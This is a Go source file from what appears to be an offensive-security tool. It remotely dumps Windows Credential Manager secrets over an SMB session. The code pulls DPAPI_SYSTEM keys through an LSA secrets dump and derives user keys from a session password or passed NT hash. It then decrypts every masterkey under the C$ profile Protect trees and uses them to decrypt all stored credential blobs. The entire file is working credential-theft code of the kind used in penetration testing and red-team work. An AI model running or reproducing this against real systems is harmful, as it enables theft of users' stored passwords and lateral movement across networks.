package smbclient

import (
	"fmt"
	"path"
	"strings"

	"anvil/internal/dpapi"
	"anvil/internal/ui"
)

// DumpCredentials decrypts the target's Credential Manager secrets. Chain:
// DPAPI_SYSTEM keys (SECURITY+SYSTEM hives, lsadump orchestration) → every
// Protect masterkey file under the profile and machine Protect trees
// (decrypted with those keys, HMAC-verified; files that resist are retried
// with keys derived from the session's own password/NT hash, which covers
// interactive users' per-user masterkeys) → every blob under the
// Credentials trees, decrypted with its GUID-matched profile masterkey.
// All over the existing session; per-item failures are warnings, never fatal.
func (s *Session) DumpCredentials() (entries []dpapi.Entry, warnings []string, err error) {
	res, warnings, err := s.LsaDump()
	if err != nil {
		return nil, warnings, err
	}

	mk, uk, ok := res.DPAPI()
	if !ok {
		return nil, warnings, fmt.Errorf("no DPAPI keys in LSA secrets (DPAPI_SYSTEM missing)")
	}
	dpapiKeys := [][]byte{mk, uk}

	// Interactive users' Protect masterkeys are encrypted with keys derived
	// from the user's own password or NT hash (HMAC-mixed with their SID),
	// not with DPAPI_SYSTEM — derive the candidates once from the session's
	// own creds. Kerberos-only sessions carry neither and skip silently.
	var userKeys [][]byte
	if creds := s.Creds(); creds != nil {
		password := creds.Password
		ntHash := ""
		if password == "" {
			// --hashes carries LMHASH:NTHASH; keep the NT half.
			ntHash = creds.Hash
			if i := strings.Index(ntHash, ":"); i >= 0 {
				ntHash = ntHash[i+1:]
			}
		}
		if password != "" || ntHash != "" {
			userKeys = dpapi.DeriveUserKeys(password, ntHash)
		}
	}

	// C$ tree for everything below; restore the caller's share after.
	prevShare := s.Share()
	if prevShare != "C$" {
		if err := s.UseShare("C$"); err != nil {
			return nil, warnings, fmt.Errorf("cannot access C$ for credential blobs: %v", err)
		}
		defer func() {
			if prevShare != "" {
				_ = s.UseShare(prevShare)
			}
		}()
	}

	// Profile roots: every dir under C:\Users, plus the SYSTEM / service
	// profile trees (where exec'd or service-planted cmdkey blobs land).
	roots := []string{}
	if fi, err := s.Ls("Users"); err == nil {
		for _, ud := range fi {
			if ud.IsDir() && ud.Name() != "." && ud.Name() != ".." {
				roots = append(roots, "Users/"+ud.Name())
			}
		}
	} else {
		return nil, warnings, fmt.Errorf("list C$\\Users: %v", err)
	}
	roots = append(roots,
		"Windows/System32/config/systemprofile",
		"Windows/ServiceProfiles/LocalService",
		"Windows/ServiceProfiles/NetworkService")

	// 1. Collect profile masterkeys: guid (filename) → decrypted masterkey.
	profileKeys := map[string][]byte{}
	var stats masterKeyStats
	protectBases := []string{"Windows/System32/Microsoft/Protect"}
	for _, root := range roots {
		protectBases = append(protectBases,
			root+"/AppData/Roaming/Microsoft/Protect",
			root+"/AppData/Local/Microsoft/Protect")
	}
	for _, base := range protectBases {
		s.collectMasterKeys(base, dpapiKeys, userKeys, profileKeys, &stats)
	}
	ui.Debugf("dpapi: %d profile masterkeys recovered (%d via DPAPI_SYSTEM, %d via session creds)",
		len(profileKeys), stats.system, stats.user)

	// 2. Walk the Credentials trees and decrypt each blob with its
	// GUID-matched profile masterkey.
	for _, root := range roots {
		for _, sub := range credentialDirs {
			dir := root + "/" + sub
			files, err := s.Ls(dir)
			if err != nil {
				continue // directory absent on most profiles — normal
			}
			for _, f := range files {
				if f.IsDir() {
					continue
				}
				remote := dir + "/" + f.Name()
				content, err := s.client.Cat(remote)
				if err != nil {
					warnings = append(warnings, fmt.Sprintf("read %s: %v", remote, err))
					continue
				}
				key, kerr := s.blobKey([]byte(content), profileKeys)
				if kerr != nil {
					warnings = append(warnings, fmt.Sprintf("%s: %v", remote, kerr))
					continue
				}
				entry, err := dpapi.DecryptBlob([]byte(content), [][]byte{key})
				if err != nil {
					warnings = append(warnings, fmt.Sprintf("%s: %v", remote, err))
					continue
				}
				entries = append(entries, *entry)
			}
		}
	}
	return entries, warnings, nil
}

// credentialDirs are the Credential Manager blob locations under each
// profile root (relative to C$ root).
var credentialDirs = []string{
	"AppData/Roaming/Microsoft/Credentials",
	"AppData/Local/Microsoft/Credentials",
}

// masterKeyStats tallies recovered profile masterkeys by key source.
type masterKeyStats struct {
	system int // decrypted with DPAPI_SYSTEM keys from the LSA dump
	user   int // decrypted with session-derived user password/NT-hash keys
}

// collectMasterKeys walks one Protect base: each subdirectory is a SID
// directory of GUID-named masterkey files (plus an optional User subdir).
// Each file is tried with the DPAPI_SYSTEM keys first, then with the
// session-derived user keys. Missing bases and unreadable files are skipped
// silently — they are expected on most systems.
func (s *Session) collectMasterKeys(base string, dpapiKeys, userKeys [][]byte, out map[string][]byte, stats *masterKeyStats) {
	sidDirs, err := s.Ls(base)
	if err != nil {
		return
	}
	for _, sd := range sidDirs {
		if !sd.IsDir() {
			// masterkey files can also sit directly under the base
			s.tryMasterKey(base+"/"+sd.Name(), dpapiKeys, userKeys, out, stats)
			continue
		}
		for _, dir := range []string{base + "/" + sd.Name(), base + "/" + sd.Name() + "/User"} {
			files, err := s.Ls(dir)
			if err != nil {
				continue
			}
			for _, f := range files {
				if f.IsDir() {
					continue
				}
				s.tryMasterKey(dir+"/"+f.Name(), dpapiKeys, userKeys, out, stats)
			}
		}
	}
}

// tryMasterKey records remote (a GUID-named Protect masterkey file) in out
// when it decrypts — with a DPAPI_SYSTEM key, or failing that with the
// session-derived user keys and the SID taken from the file's path.
func (s *Session) tryMasterKey(remote string, dpapiKeys, userKeys [][]byte, out map[string][]byte, stats *masterKeyStats) {
	content, err := s.client.Cat(remote)
	if err != nil || len(content) < 160 {
		return
	}
	name := remote[strings.LastIndex(remote, "/")+1:]
	if key, err := dpapi.DecryptMasterKeyFile([]byte(content), dpapiKeys); err == nil {
		out[name] = key
		stats.system++
		return
	}
	// Interactive users' masterkeys are protected with password-derived
	// keys; retry with the session's own keys if we have them.
	if sid := sidFromPath(remote); sid != "" && len(userKeys) > 0 {
		if key, err := dpapi.DecryptUserMasterKeyFile([]byte(content), sid, userKeys); err == nil {
			out[name] = key
			stats.user++
			return
		}
	}
	ui.Debugf("dpapi: %s not decryptable with available keys", remote)
}

// sidFromPath returns the SID directory name enclosing a Protect masterkey
// file: the parent directory (.../Protect/<SID>/<guid>), or the grandparent
// for files under the optional <SID>/User subdir. "" when the name is not a
// SID (e.g. files directly under the Protect base).
func sidFromPath(remote string) string {
	sid := path.Base(path.Dir(remote))
	if strings.EqualFold(sid, "user") {
		sid = path.Base(path.Dir(path.Dir(remote)))
	}
	if !strings.HasPrefix(sid, "S-") {
		return ""
	}
	return sid
}

// blobKey picks the profile masterkey whose GUID matches the blob's
// GuidMasterKey field.
func (s *Session) blobKey(content []byte, profileKeys map[string][]byte) ([]byte, error) {
	guid, err := dpapi.BlobMasterKeyGUID(content)
	if err != nil {
		return nil, err
	}
	key, ok := profileKeys[guid]
	if !ok {
		return nil, fmt.Errorf("no profile masterkey for guid %s", guid)
	}
	return key, nil
}
